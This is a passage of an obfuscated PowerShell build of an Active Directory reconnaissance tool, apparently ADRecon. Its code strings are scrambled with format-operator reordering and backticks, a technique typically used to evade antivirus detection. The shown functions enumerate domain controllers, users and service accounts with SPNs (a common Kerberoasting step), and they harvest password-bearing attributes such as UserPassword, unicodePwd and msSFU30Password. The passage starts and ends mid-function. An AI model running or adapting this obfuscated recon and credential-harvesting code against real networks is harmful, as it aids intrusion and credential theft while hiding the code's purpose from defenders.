            &("{1}{0}{2}" -f'ite-','Wr','Verbose') "[*] Total Domain Controllers: $([ADRecon.ADWSClass]::ObjectCount($ADDomainControllers)) "
            ${D`cObJ} =   ( VArIaBLe  ('9'+'B5p6') -vAluE )::("{3}{1}{0}{4}{2}{5}" -f'Contr','omain','erP','D','oll','arser').Invoke(${Add`o`M`AI`N`ConTrOLlERS}, ${t`HR`EAds})
            &("{0}{2}{3}{1}"-f'Remove-','e','Var','iabl') ("{2}{3}{0}{1}{4}"-f'o','lle','ADDomai','nContr','rs')
        }
    }

    If (${M`e`THod} -eq ("{0}{1}"-f 'LD','AP'))
    {
        If (${CRed`En`TI`AL} -ne   ( GET-VARiaBlE  CLF0N ).vAlUe::"eM`PTY")
        {
            ${dOm`A`inFqDN} = &("{2}{0}{1}"-f't-DNtoFQ','DN','Ge')(${ob`j`domA`iN}."Di`STIng`UI`shEdNaME")
            ${DO`M`AI`NC`OntexT} = &("{2}{0}{1}"-f 'Obje','ct','New-') ("{16}{13}{1}{11}{14}{0}{8}{5}{7}{12}{9}{15}{6}{4}{2}{3}{10}"-f 'ice','irect','o','r','ct','Act','ire','i','s.','y','yContext','or','veDirector','m.D','yServ','.D','Syste')(("{0}{1}{2}" -f 'D','o','main'),$(${doma`iNF`q`dN}),$(${CrE`dENt`i`AL}."U`SER`NamE"),$(${crED`EN`T`Ial}.("{2}{1}{4}{3}{5}{0}"-f 'al','etNetwo','G','Cre','rk','denti').Invoke()."Pas`swoRd"))
            Try
            {
                ${ADDOM`A`IN} =   (cHilditEM  ("V"+"aRI"+"ABlE:"+"UX5M")  ).vAlUe::("{0}{2}{1}"-f'Ge','in','tDoma').Invoke(${DOM`Ai`NcOn`TExT})
            }
            Catch
            {
                &("{1}{2}{0}"-f'arning','Write-','W') ("{10}{2}{5}{3}{8}{6}{7}{1}{4}{0}{9}" -f'Cont','m','Get-ADRD','nContro','ain ','omai','g','etting Do','ller] Error ','ext','[')
                &("{3}{2}{0}{1}" -f'te-','Verbose','i','Wr') "[EXCEPTION] $($_.Exception.Message) "
                Return ${n`Ull}
            }
            &("{3}{1}{4}{2}{0}"-f 'e','m','-Variabl','Re','ove') ("{0}{3}{1}{2}"-f 'D','mai','nContext','o')
        }
        Else
        {
            ${ADD`Om`A`in} =   ( gET-vaRIable ("ux"+"5m") ).value::("{3}{2}{1}{0}" -f'n','mai','ntDo','GetCurre').Invoke()
        }

        If (${AddOma`iN}."dom`AInCo`Nt`RO`lle`Rs")
        {
            &("{0}{1}{3}{2}"-f'Wri','te-Ver','se','bo') "[*] Total Domain Controllers: $([ADRecon.LDAPClass]::ObjectCount($ADDomain.DomainControllers)) "
            ${DCo`BJ} =   $olxE::("{2}{5}{4}{6}{1}{0}{3}"-f'e','lerPars','Domain','r','ntro','Co','l').Invoke(${a`DD`O`MaiN}."doMA`iNco`NTRO`Lle`RS", ${tHRe`Ads})
            &("{2}{4}{0}{3}{1}"-f 'ri','ble','Remov','a','e-Va') ("{0}{1}{2}" -f 'ADDoma','i','n')
        }
    }

    If (${d`C`Obj})
    {
        Return ${DC`ObJ}
    }
    Else
    {
        Return ${nU`LL}
    }
}

Function G`ET`-adrUsER
{

    param(
        [Parameter(MaNDAToRY = ${t`RUe})]
        [string] ${m`eThOd},

        [Parameter(mandatOrY = ${tr`Ue})]
        [DateTime] ${DA`Te},

        [Parameter(mandaTORy = ${Fa`L`se})]
        [DirectoryServices.DirectoryEntry] ${OB`JDOm`A`IN},

        [Parameter(mAndAToRY = ${T`Rue})]
        [int] ${D`ORMANT`Ti`Mes`Pan} = 90,

        [Parameter(MANDAtorY = ${Tr`UE})]
        [int] ${P`AGEsize} = 200,

        [Parameter(mANdATorY = ${fA`lsE})]
        [int] ${Th`REA`DS} = 10,

        [Parameter(MAnDAtORY = ${F`A`LSE})]
        [int] ${ADR`U`serS} = ${TR`UE},

        [Parameter(mAnDaTORy = ${f`AlsE})]
        [int] ${AD`RUsErSP`NS} = ${FAL`SE},

        [Parameter(MANdATORY = ${F`ALSe})]
        [int] ${O`NlYENA`BL`Ed} = ${f`A`lSE}
    )

    If (${M`EThod} -eq ("{1}{0}"-f'DWS','A'))
    {
        If (!${AD`RU`SeRS})
        {
            Try
            {
                If (${o`Nl`y`ENableD})
                {
                    ${ad`U`SERS} = @( &("{2}{0}{3}{1}" -f'-ADO','ject','Get','b') -LDAPFilter ("{3}{12}{6}{26}{27}{19}{2}{9}{7}{14}{4}{29}{5}{10}{1}{8}{20}{22}{11}{0}{24}{18}{13}{15}{16}{17}{25}{28}{23}{21}" -f'untContr','lNam','tTy','(&','68)(','i','s','=8053','e=*)(!user','pe','pa','o','(','40','063','.11','3556.','1.4.','8','n','Ac','=2))','c','3:','ol:1.2.','8','am','Accou','0','servicePrinc') -ResultPageSize ${PaG`ES`ize} -Properties ("{0}{1}"-f 'N','ame'),("{0}{2}{1}"-f'De','ion','script'),("{1}{0}" -f 'erOf','memb'),("{3}{2}{1}{0}"-f 'e','m','ntNa','sAMAccou'),("{5}{1}{2}{4}{3}{0}" -f'me','e','rvice','ipalNa','Princ','s'),("{4}{3}{0}{2}{1}"-f 'ryG','pID','rou','ima','pr'),("{0}{2}{1}"-f'pwdLa','Set','st'),("{3}{4}{0}{2}{1}"-f'AccountCon','l','tro','us','er') )
                }
                Else
                {
                    ${A`dusERS} = @( &("{2}{1}{3}{0}"-f'ject','et-A','G','DOb') -LDAPFilter ((("{14}{2}{5}{9}{13}{3}{6}{4}{15}{0}{1}{10}{8}{11}{7}{12}"-f'368)','(','a','untType=','5','m','80','ipalNa','ri','Acc','serviceP','nc','me=*))','o','(&(s','306'))) -ResultPageSize ${pa`Ge`SIZe} -Properties ("{0}{1}"-f'N','ame'),("{1}{2}{0}" -f'iption','De','scr'),("{0}{2}{1}" -f'm','f','emberO'),("{3}{0}{1}{2}" -f 'A','MAccountNa','me','s'),("{3}{0}{4}{2}{1}{5}" -f'rvic','alN','rincip','se','eP','ame'),("{0}{2}{1}{4}{3}" -f'prima','yGro','r','ID','up'),("{1}{2}{0}" -f 'tSet','pwdL','as'),("{2}{1}{3}{0}{4}"-f'ntr','t','userAccoun','Co','ol') )
                }
            }
            Catch
            {
                &("{0}{3}{1}{4}{2}" -f 'W','t','g','ri','e-Warnin') ("{4}{1}{2}{3}{5}{10}{6}{7}{9}{0}{8}" -f' Obje',']',' E','rror w','[Get-ADRUser','hile enu','ti','ng U','cts','serSPN','mera')
                &("{0}{4}{2}{1}{3}" -f 'Wri','b','er','ose','te-V') "[EXCEPTION] $($_.Exception.Message) "
                Return ${Nu`Ll}
            }
        }
        Else
        {
            Try
            {
                If (${On`lyEn`AbL`ed})
                {
                    ${a`Du`SErS} = @( &("{2}{1}{0}"-f 'User','AD','Get-') -Filter ('e'+'n'+'abled '+'-eq'+' '+('{0}'+'t'+'rue')-f  [cHAR]36) -ResultPageSize ${pAGE`S`ize} -Properties ("{4}{2}{1}{0}{3}{5}" -f 'ationD','countExpir','c','at','A','e'),("{3}{2}{1}{0}{4}"-f'Exp','t','ccoun','a','ires'),("{0}{2}{3}{1}" -f 'Ac','legated','countNo','tDe'),("{1}{0}{2}" -f 'oun','AdminC','t'),("{6}{5}{3}{1}{2}{7}{0}{4}"-f'cry','ReversiblePasswo','rdE','ow','ption','l','Al','n'),('c'),("{0}{4}{2}{3}{1}" -f 'Can','rd','otChangePas','swo','n'),("{3}{2}{1}{0}" -f 'me','a','onicalN','Can'),("{0}{2}{1}" -f'Co','any','mp'),("{0}{2}{3}{1}"-f'D','artment','e','p'),("{0}{1}{2}{3}" -f'D','es','c','ription'),("{1}{2}{3}{4}{0}" -f'e','D','ist','inguishedN','am'),("{5}{4}{3}{1}{6}{0}{2}"-f 'e','otRequire','Auth','N','s','Doe','Pr'),("{0}{1}"-f 'Enable','d'),("{2}{0}{1}"-f'am','e','givenN'),("{0}{1}{3}{2}"-f 'homeD','i','ry','recto'),("{1}{0}"-f'o','Inf'),("{1}{2}{0}{3}"-f'gonD','L','astLo','ate'),("{4}{3}{1}{2}{0}"-f'tamp','onTim','es','Log','last'),("{0}{1}{2}"-f'Lo','cked','Out'),("{2}{4}{0}{1}{3}"-f 'a','ti','LogonW','ons','orkst'),("{0}{1}"-f'ma','il'),("{0}{1}"-f 'Ma','nager'),("{2}{0}{1}" -f 'mb','erOf','me'),("{0}{1}{2}" -f 'middl','eN','ame'),("{0}{1}" -f 'mob','ile'),("{1}{0}{4}{6}{7}{3}{5}{2}" -f 'sDS-Al','m','teTo','ele','lowed','ga','To','D'),("{6}{4}{0}{5}{2}{1}{3}" -f'o','T','cryption','ypes','S-Supp','rtedEn','msD'),("{1}{0}" -f 'me','Na'),("{3}{1}{0}{2}" -f'swordExp','as','ired','P'),("{0}{3}{1}{2}" -f 'P','swordLast','Set','as'),("{2}{3}{1}{0}{4}" -f'e','verExpir','P','asswordNe','s'),("{1}{2}{0}{3}" -f'quire','Pas','swordNotRe','d'),("{1}{2}{0}{3}" -f 'ryGrou','pr','ima','pID'),("{1}{2}{0}"-f 'th','p','rofilePa'),("{0}{1}{2}"-f 'p','wdlastse','t'),("{1}{3}{2}{0}{4}" -f'ntNa','SamAc','u','co','me'),("{2}{1}{0}" -f 'iptPath','cr','S'),("{3}{0}{4}{2}{1}"-f 'ce','Name','incipal','servi','Pr'),("{0}{1}"-f 'SI','D'),("{2}{1}{0}{3}" -f 'st','IDHi','S','ory'),("{3}{2}{1}{4}{0}" -f'ed','R','martcardLogon','S','equir'),('sn'),("{0}{1}"-f 'Ti','tle'),("{2}{3}{4}{1}{0}" -f'ion','t','TrustedForDe','leg','a'),("{2}{5}{0}{4}{1}{3}" -f 'hFor','elegat','Trusted','ion','D','ToAut'),("{1}{2}{3}{0}" -f 'y','U','seDESKeyOn','l'),("{3}{4}{0}{1}{5}{2}" -f'ntCo','n','ol','Us','erAccou','tr'),("{1}{2}{0}" -f 'ged','when','Chan'),("{3}{2}{1}{0}" -f 'ed','t','rea','whenC') )
                }
                Else
                {
                    ${aDU`s`ERs} = @( &("{1}{0}{2}" -f'DUs','Get-A','er') -Filter * -ResultPageSize ${pA`ge`SiZE} -Properties ("{0}{1}{3}{2}{4}"-f 'A','ccount','ionDa','Expirat','te'),("{3}{2}{0}{4}{1}"-f'u','pires','co','ac','ntEx'),("{3}{2}{0}{1}" -f 'tD','elegated','ountNo','Acc'),("{1}{2}{3}{0}"-f 'unt','A','dm','inCo'),("{5}{3}{6}{7}{1}{8}{0}{2}{4}"-f 'Encryp','s','ti','wRe','on','Allo','ve','rsiblePas','word'),('c'),("{0}{5}{2}{4}{3}{1}"-f'C','rd','tC','gePasswo','han','anno'),("{0}{3}{1}{2}" -f 'Can','nicalNam','e','o'),("{1}{0}{2}"-f 'omp','C','any'),("{1}{0}{2}" -f'm','Depart','ent'),("{0}{2}{1}{3}" -f'De','ptio','scri','n'),("{3}{0}{2}{4}{1}" -f'st','uishedName','i','Di','ng'),("{5}{4}{3}{0}{1}{2}"-f 're','Aut','h','reP','equi','DoesNotR'),("{1}{0}" -f 'ed','Enabl'),("{0}{2}{3}{1}"-f'g','enName','i','v'),("{2}{1}{0}" -f'tory','Direc','home'),("{1}{0}" -f 'nfo','I'),("{1}{2}{0}"-f'te','LastLogo','nDa'),("{3}{2}{1}{0}"-f'mestamp','Ti','stLogon','la'),("{0}{1}"-f 'Loc','kedOut'),("{2}{1}{0}{3}"-f'ation','kst','LogonWor','s'),("{0}{1}"-f'mai','l'),("{1}{0}"-f 'anager','M'),("{0}{1}{2}"-f 'membe','rO','f'),("{1}{2}{0}" -f'leName','mid','d'),("{0}{1}"-f 'mobil','e'),("{3}{4}{2}{1}{0}"-f'oDelegateTo','lowedT','l','msD','S-A'),("{2}{6}{0}{4}{5}{3}{1}" -f 'uppor','s','m','e','tedEn','cryptionTyp','sDS-S'),("{0}{1}" -f'N','ame'),("{4}{0}{1}{2}{3}" -f'assw','ordEx','pire','d','P'),("{3}{4}{1}{2}{0}"-f 'et','wordL','astS','Pas','s'),("{0}{1}{2}{4}{3}"-f 'Pa','ss','wor','res','dNeverExpi'),("{0}{1}{2}{3}"-f 'Pas','swordNot','R','equired'),("{3}{0}{4}{2}{1}" -f'imar','D','GroupI','pr','y'),("{3}{2}{1}{0}"-f'th','Pa','ile','prof'),("{2}{1}{0}" -f 't','lastse','pwd'),("{3}{1}{2}{0}" -f 'e','ntN','am','SamAccou'),("{2}{1}{0}" -f 'th','iptPa','Scr'),("{6}{4}{1}{2}{0}{5}{3}" -f 'p','Pr','inci','lName','ice','a','serv'),("{1}{0}" -f'ID','S'),("{2}{0}{1}"-f 'IDHistor','y','S'),("{3}{2}{0}{1}{4}"-f'ardLog','onRe','artc','Sm','quired'),('sn'),("{0}{1}"-f 'Tit','le'),("{0}{1}{2}{3}"-f 'Tr','ustedForDel','egat','ion'),("{6}{2}{5}{4}{0}{3}{1}"-f'legat','on','oAu','i','rDe','thFo','TrustedT'),("{3}{1}{2}{0}"-f 'KeyOnly','seD','ES','U'),("{0}{3}{4}{2}{1}"-f'UserA','trol','on','cc','ountC'),("{3}{0}{1}{2}" -f 'hen','Chang','ed','w'),("{1}{2}{0}" -f 'ted','whenCr','ea') )
                }
            }
            Catch
            {
                &("{3}{1}{0}{2}" -f'n','rni','g','Write-Wa') ("{0}{2}{6}{12}{8}{9}{7}{11}{4}{10}{3}{5}{1}" -f'[Get-ADRUser] Err','jects','or',' O',' U','b',' ','ra','ile',' enume','ser','ting','wh')
                &("{2}{3}{4}{1}{0}" -f'e','s','Wri','te-Ve','rbo') "[EXCEPTION] $($_.Exception.Message) "
                Return ${nu`ll}
            }
        }
        If (${A`D`UsERs})
        {
            &("{1}{2}{0}"-f'e-Verbose','Wr','it') "[*] Total Users: $([ADRecon.ADWSClass]::ObjectCount($ADUsers)) "
            If (${aD`RuS`ERS})
            {
                Try
                {
                    ${Adp`AsS`PoLi`cY} = &("{0}{6}{3}{1}{10}{9}{7}{5}{8}{2}{4}"-f'Get','e','ssword','ADD','Policy','mainP','-','Do','a','ult','fa')
                    ${pASS`m`A`XagE} = ${a`D`PA`ssPOLiCY}."MAXPaSS`woRDA`gE"."d`AYs"
                    &("{1}{3}{0}{2}{4}" -f 'V','Rem','ariabl','ove-','e') ("{1}{0}{2}{3}"-f 'ass','ADp','poli','cy')
                }
                Catch
                {
                    &("{0}{1}{2}" -f 'W','rite-Warn','ing') ("{4}{26}{27}{20}{2}{1}{11}{29}{25}{10}{3}{5}{14}{17}{24}{28}{12}{16}{8}{0}{15}{21}{6}{9}{18}{13}{19}{7}{22}{23}"-f 'wor','e','etri','ge f','[Get','rom','lic','d','ass','y. ','ord A','ving Max P','l','ng value as ',' ','d P','t P','the D','Usi','90 ',' Error r','o','ay','s','ef','sw','-ADRU','ser]','au','as')
                    &("{1}{3}{0}{2}"-f's','Wri','e','te-Verbo') "[EXCEPTION] $($_.Exception.Message) "
                    ${P`AS`SMAXAge} = 90
                }
                ${US`Er`obj} =   (  VaRiABLe ("9"+"B5P6") -ValUEOnl  )::("{0}{1}{2}" -f 'Use','rP','arser').Invoke(${ad`USeRS}, ${d`ATe}, ${DOrmanT`T`Ime`spAn}, ${Pa`Ss`Maxa`gE}, ${thReA`dS})
            }
            If (${aDRusEr`S`P`Ns})
            {
                ${US`eRSpNO`Bj} =   ( vaRiaBLE ("9B5"+"p6")  ).vaLUE::("{2}{0}{1}"-f'se','r','UserSPNPar').Invoke(${AduS`Ers}, ${tHR`E`ADS})
            }
            &("{2}{0}{1}" -f'e','-Variable','Remov') ("{0}{1}{2}"-f 'ADU','se','rs')
        }
    }

    If (${Meth`od} -eq ("{1}{0}" -f 'P','LDA'))
    {
        If (!${aD`RUsERs})
        {
            ${obJ`sE`ARCHEr} = &("{0}{3}{2}{1}" -f'Ne','t','Objec','w-') ("{6}{4}{0}{5}{2}{1}{3}" -f 'Direc','.','ces','DirectorySearcher','ystem.','toryServi','S') ${OBJ`d`oMain}
            ${o`Bjs`earcHer}."P`AGEsI`ze" = ${PaGe`s`Ize}
            If (${Only`eNaBL`Ed})
            {
                ${ObJse`A`R`CHeR}."fi`ltEr" = ((("{10}{15}{12}{3}{11}{9}{8}{4}{13}{16}{17}{5}{0}{7}{14}{2}{1}{6}"-f'ame=*)(!us','4.803','.840.113556.1.','un','06','ncipalN',':=2))','erAccountCont','53','Type=80','(&','t','o','368)(servic','rol:1.2','(samAcc','ePr','i')))
            }
            Else
            {
                ${oB`j`sEaRcH`er}."F`iL`Ter" = (("{7}{4}{0}{5}{1}{3}{8}{2}{6}"-f 'untTyp','06368)(se','Nam','rvicePrin','(samAcco','e=8053','e=*))','(&','cipal'))
            }
            ${O`BJSea`RC`heR}."pROPERTI`E`STO`loAd".("{0}{2}{1}"-f 'AddR','ge','an').Invoke((("{0}{1}"-f'n','ame'),("{1}{0}{2}"-f 'esc','d','ription'),("{0}{1}"-f'membero','f'),("{1}{2}{0}" -f'ccountname','s','ama'),("{5}{0}{1}{3}{2}{4}"-f'r','vicepri','ipal','nc','name','se'),("{2}{1}{3}{4}{0}"-f 'id','mary','pri','grou','p'),("{1}{0}{2}"-f's','pwdlast','et'),("{3}{2}{1}{4}{0}"-f 'l','ccountcontr','sera','u','o')))
            ${oBj`S`EaR`chER}."s`EAr`cHSc`OpE" = ("{0}{1}" -f'S','ubtree')
            Try
            {
                ${Adus`ErS} = ${oB`jse`Ar`chER}.("{0}{1}"-f 'FindA','ll').Invoke()
            }
            Catch
            {
                &("{1}{0}{2}{3}{4}" -f 'ite','Wr','-W','a','rning') ("{4}{5}{7}{11}{6}{0}{3}{2}{8}{12}{9}{10}{1}" -f 'o','s',' while','r','[Get','-A',' Err','DRU',' ','ating Use','rSPN Object','ser]','enumer')
                &("{0}{1}{2}" -f 'Wr','ite-Verbos','e') "[EXCEPTION] $($_.Exception.Message) "
                Return ${nU`lL}
            }
            ${OB`j`s`EarCHEr}.("{1}{0}" -f'e','dispos').Invoke()
        }
        Else
        {
            ${oBjS`ea`RC`hER} = &("{2}{3}{0}{1}"-f 'w-O','bject','N','e') ("{2}{1}{3}{0}{6}{5}{4}"-f'DirectoryS','m.DirectorySe','Syste','rvices.','her','arc','e') ${oB`jd`OMAIN}
            ${oBJS`E`A`RCher}."PAge`Si`zE" = ${Page`SizE}
            If (${OnLYE`NA`B`LEd})
            {
                ${ob`J`SEar`CHeR}."fILt`er" = (("{5}{14}{19}{17}{13}{10}{6}{4}{3}{0}{20}{18}{1}{8}{2}{11}{12}{7}{15}{16}{9}"-f 'se','ountContr','.2.840.1',')(!u','06368','(','e=8053','4.','ol:1','=2))','tTyp','13556.','1.','n','&','803',':','samAccou','Acc','(','r'))
            }
            Else
            {
                ${obJ`SE`ArcHER}."fIl`TEr" = ("{3}{0}{5}{1}{4}{2}{6}" -f'sa','Type=805306','8','(','36','mAccount',')')
            }
                
            ${O`BjseA`RCheR}."se`C`U`RITYMaS`kS" = [System.DirectoryServices.SecurityMasks]("{1}{0}" -f'acl','D')
            ${O`BjsEa`R`cHEr}."PrOP`E`RTi`E`st`oload".("{2}{1}{0}"-f 'nge','Ra','Add').Invoke((("{1}{3}{2}{0}" -f'tExpires','a','un','cco'),("{1}{0}{2}" -f 'nco','admi','unt'),"c",("{0}{2}{1}{3}" -f'ca','onicalnam','n','e'),("{0}{1}" -f'c','ompany'),("{1}{0}{3}{2}" -f 'e','d','artment','p'),("{2}{1}{3}{0}" -f'ption','scr','de','i'),("{0}{3}{4}{1}{2}"-f'dis','is','hedname','ti','ngu'),("{2}{1}{0}" -f 'ame','enN','giv'),("{3}{0}{2}{1}"-f 'edirect','y','or','hom'),("{1}{0}" -f 'nfo','i'),("{2}{0}{1}{4}{3}"-f'st','Lo','la','ontimestamp','g'),("{1}{0}"-f'il','ma'),("{0}{1}{2}"-f 'man','a','ger'),("{1}{0}{2}" -f 'mb','me','erof'),("{2}{0}{1}" -f'leNa','me','midd'),("{1}{0}"-f'le','mobi'),("{0}{1}{2}{5}{4}{6}{3}"-f 'ms','DS-','AllowedT','To','eg','oDel','ate'),("{5}{3}{2}{4}{1}{0}"-f'ypes','upportedEncryptionT','S-','sD','S','m'),("{0}{1}" -f'nam','e'),("{6}{3}{0}{2}{5}{4}{1}" -f'curitydes','r','cr','tse','pto','i','n'),("{2}{0}{1}" -f 'bjects','id','o'),("{3}{1}{0}{2}"-f 'i','roup','d','primaryg'),("{1}{0}{3}{2}"-f'fi','pro','h','lepat'),("{1}{2}{0}" -f't','pw','dLastSe'),("{3}{1}{2}{0}" -f 'ame','ma','ccountN','sa'),("{0}{1}{3}{2}"-f 'sc','ri','path','pt'),("{0}{4}{2}{3}{1}{5}"-f'se','cipalnam','vicepri','n','r','e'),("{0}{1}{2}" -f's','idhist','ory'),"sn",("{0}{1}"-f'tit','le'),("{1}{2}{0}{5}{4}{3}"-f 'co','user','ac','trol','tcon','un'),("{2}{3}{0}{1}"-f 'rworksta','tions','us','e'),("{0}{1}{2}"-f'when','ch','anged'),("{2}{3}{0}{1}"-f 'reat','ed','whe','nc')))
            ${oBJs`eARc`heR}."SeA`RCHs`cOpe" = ("{0}{1}"-f 'Su','btree')
            Try
            {
                ${adUs`E`RS} = ${obJ`s`eA`Rcher}.("{1}{0}{2}"-f 'i','F','ndAll').Invoke()
            }
            Catch
            {
                &("{0}{3}{2}{1}"-f 'Write-','g','n','Warni') ("{3}{9}{4}{6}{0}{7}{8}{1}{10}{5}{2}"-f 'le','umerat','ts','[Get-A','r ','Objec','whi',' e','n','DRUser] Erro','ing User ')
                &("{1}{4}{2}{3}{0}" -f 'rbose','W','-','Ve','rite') "[EXCEPTION] $($_.Exception.Message) "
                Return ${n`ULl}
            }
            ${OBj`SEArCH`Er}.("{1}{0}{2}" -f'is','d','pose').Invoke()
        }
        If (${a`DUse`Rs})
        {
            &("{1}{2}{0}"-f'rbose','Wri','te-Ve') "[*] Total Users: $([ADRecon.LDAPClass]::ObjectCount($ADUsers)) "
            If (${a`Drus`ErS})
            {
                ${pAS`sMaXa`gE} = $(${objd`O`M`Ain}.("{6}{1}{4}{2}{3}{0}{5}"-f'rToInt6','onver','ge','Intege','tLar','4','C').Invoke(${OBjd`O`mAIN}."mAXP`WDa`GE"."vAL`Ue") /-864000000000)
                If (-Not ${pA`s`SmaXaGe})
                {
                    &("{3}{0}{2}{1}"-f'ri','ning','te-War','W') ("{17}{7}{18}{1}{8}{2}{10}{15}{14}{3}{16}{4}{11}{6}{13}{0}{5}{9}{12}" -f 'Usi','tr','x P','om t','l','ng val',' Pa','or ','ieving Ma','ue as 90 da','ass','t','ys','ssword Policy. ','rd Age fr','wo','he Defau','[Get-ADRUser] Err','re')
                    &("{0}{2}{1}"-f 'Write-','bose','Ver') "[EXCEPTION] $($_.Exception.Message) "
                    ${PA`ssMAX`AGE} = 90
                }
                ${uSEr`O`Bj} =   ( GEt-VariAblE oLXE).vAlUe::("{1}{2}{0}"-f 'arser','Use','rP').Invoke(${A`DuSe`Rs}, ${d`Ate}, ${DoRmA`Nt`T`iMes`P`AN}, ${pasSMa`x`A`ge}, ${TH`READS})
            }
            If (${a`D`RU`serspnS})
            {
                ${U`SErspn`OBj} =   (GI  varIABlE:Olxe ).VAlUE::("{0}{1}{2}" -f 'Us','er','SPNParser').Invoke(${adus`E`Rs}, ${Th`Rea`dS})
            }
            &("{1}{2}{4}{3}{0}"-f'able','Remov','e-Va','i','r') ("{1}{0}{2}"-f 'se','ADU','rs')
        }
    }

    If (${USe`R`OBJ})
    {
        &("{1}{2}{0}" -f'R','Export','-AD') -ADRObj ${usE`RObJ} -ADROutputDir ${adRoUtpUT`D`Ir} -OutputType ${out`putt`Y`Pe} -ADRModuleName ("{0}{1}"-f 'Use','rs')
        &("{1}{3}{0}{4}{2}" -f 'e-','Remo','iable','v','Var') ("{1}{0}"-f'rObj','Use')
    }
    If (${USERSP`N`OBJ})
    {
        &("{0}{2}{3}{1}" -f 'Exp','DR','o','rt-A') -ADRObj ${u`SE`RSpnOBJ} -ADROutputDir ${A`DrouTpUTd`Ir} -OutputType ${OUtp`UT`Ty`PE} -ADRModuleName ("{0}{1}"-f'Use','rSPNs')
        &("{0}{3}{2}{4}{1}" -f 'Remo','e','e-Va','v','riabl') ("{0}{3}{2}{1}" -f 'UserS','j','Ob','PN')
    }
}


Function G`E`T-Ad`RPA`SsWoRDA`TTriBu`Tes
{

    param(
        [Parameter(maNdAtoRy = ${TR`UE})]
        [string] ${M`et`HOd},

        [Parameter(mAndAtORy = ${FA`L`SE})]
        [DirectoryServices.DirectoryEntry] ${o`BjdoM`A`IN},

        [Parameter(MANDAtory = ${T`RuE})]
        [int] ${P`A`GESIze}
    )

    If (${M`EtH`Od} -eq ("{0}{1}" -f 'ADW','S'))
    {
        Try
        {
            ${A`DuSE`RS} = &("{0}{2}{1}" -f 'Ge','ct','t-ADObje') -LDAPFilter (((("{16}{3}{6}{7}{1}{2}{9}{10}{0}{14}{11}{13}{8}{4}{15}{5}{12}"-f'r','x','U','s','Pwd=','msSFU30Password=','erPass','word=*)(Uni','ode','serPas','swo','=*)(uni','*))','c','d','*)(','(7e3(U'))-cREPlacE([ChAR]55+[ChAR]101+[ChAR]51),[ChAR]124)) -ResultPageSize ${Pa`ge`si`zE} -Properties ('*')
        }
        Catch
        {
            &("{1}{0}{2}{3}"-f'te','Wri','-Wa','rning') ("{10}{14}{15}{18}{0}{8}{7}{13}{11}{9}{4}{5}{12}{17}{3}{6}{1}{2}{16}" -f'tt','rib','ut','A','i','ng Passw','tt','bu','ri','umerat','[G','n','o','tes] Error while e','et-A','DRPassw','es','rd ','ordA')
            &("{2}{3}{0}{1}"-f 'ite-Ve','rbose','W','r') "[EXCEPTION] $($_.Exception.Message) "
            Return ${N`ULL}
        }

        If (${aDU`s`eRS})
        {
            &("{2}{1}{0}{3}" -f 'te','i','Wr','-Warning') "[*] Total PasswordAttribute Objects: $([ADRecon.ADWSClass]::ObjectCount($ADUsers)) "
            ${U`sErO`BJ} = ${AdUS`e`RS}
            &("{3}{0}{1}{2}" -f 'emov','e-Var','iable','R') ("{1}{2}{0}" -f 'rs','AD','Use')
        }
    }

    If (${mE`T`hOD} -eq ("{0}{1}" -f 'LD','AP'))
    {
        ${ObJsE`AR`ChER} = &("{0}{2}{1}" -f'New-','bject','O') ("{5}{1}{0}{2}{8}{4}{3}{7}{6}" -f '.DirectorySe','em','rvices','cto','Dire','Syst','ySearcher','r','.') ${O`Bj`D`OMAiN}
        ${Obj`se`Ar`CHeR}."P`AgESI`Ze" = ${PAG`es`IZE}
        ${Ob`JS`E`ARchER}."f`IlTEr" = ((("{11}{2}{8}{12}{10}{4}{9}{0}{13}{3}{1}{6}{7}{5}{14}" -f 'rd','wd=','0}(UserPasswor','deP','Passw','0Pas','*)(msSF','U3','d=*)(UnixUs','o','r','({','e','=*)(unico','sword=*))'))-f [cHAr]124)
        ${ObJ`Se`ARcH`eR}."sEA`RChs`COpe" = ("{1}{0}" -f 'ree','Subt')
        Try
        {
            ${a`dU`SeRs} = ${OBJSEAr`c`HER}.("{2}{0}{1}"-f 'indAl','l','F').Invoke()
        }
        Catch
        {
            &("{0}{2}{1}"-f 'W','-Warning','rite') ("{2}{1}{3}{0}{5}{12}{14}{7}{9}{13}{8}{4}{6}{10}{16}{11}{15}" -f 'd','ADRPassw','[Get-','or','r while e','At','n','te',' Erro','s','umerating Password','ibut','trib',']','u','es',' Attr')
            &("{2}{3}{0}{1}"-f'-V','erbose','W','rite') "[EXCEPTION] $($_.Exception.Message) "
            Return ${N`Ull}
        }
        ${o`BjseAR`C`HER}.("{1}{0}{2}"-f'is','d','pose').Invoke()

        If (${aDus`eRS})
        {
            ${c`NT} =  (  vaRIaBLe  oLXe -ValuEONl  )::("{3}{0}{2}{1}" -f'b','nt','jectCou','O').Invoke(${a`Du`sErs})
            If (${c`NT} -gt 0)
            {
                &("{2}{1}{0}" -f'rning','-Wa','Write') ('[*]'+' '+'Tot'+'al '+'P'+'as'+'swordAttr'+'ibute '+'Obje'+'cts'+': '+"$cnt")
            }
            ${U`SER`Obj} = ${AD`USe`RS}
            &("{2}{1}{3}{0}{4}" -f'ab','ove-V','Rem','ari','le') ("{0}{1}"-f'AD','Users')
        }
    }

    If (${u`s`EroBj})
    {
        Return ${U`SErobj}
    }
    Else
    {
        Return ${N`ULL}
    }
}

Function GEt-a`dR`grOUP
{

    param(
        [Parameter(mandaTORy = ${t`RuE})]
        [string] ${MET`HOd},

        [Parameter(MANDaTOrY = ${tr`UE})]
        [DateTime] ${da`Te},

        [Parameter(maNDaTorY = ${f`ALSE})]
        [DirectoryServices.DirectoryEntry] ${obJ`DoMa`IN},

        [Parameter(MaNDatORY = ${TR`Ue})]
        [int] ${p`AgE`sIze} = 200,

        [Parameter(mANDaTOry = ${f`Al`Se})]
        [int] ${TH`R`EADs} = 10,

        [Parameter(maNDatoRY = ${TR`UE})]
        [string] ${a`drO`UtPu`TDIr},

        [Parameter(MANDaToRY = ${t`RUe})]
        [array] ${OU`TPuTt`yPE},

        [Parameter(MaNDATORY = ${f`ALSE})]
        [bool] ${aDrG`R`ouPs} = ${T`RuE},

        [Parameter(MANdAtorY = ${fal`sE})]
        [bool] ${AdRGR`O`U`PCHaNGES} = ${F`ALse}
    )

    If (${mEt`Hod} -eq ("{1}{0}"-f 'DWS','A'))
    {
        Try
        {
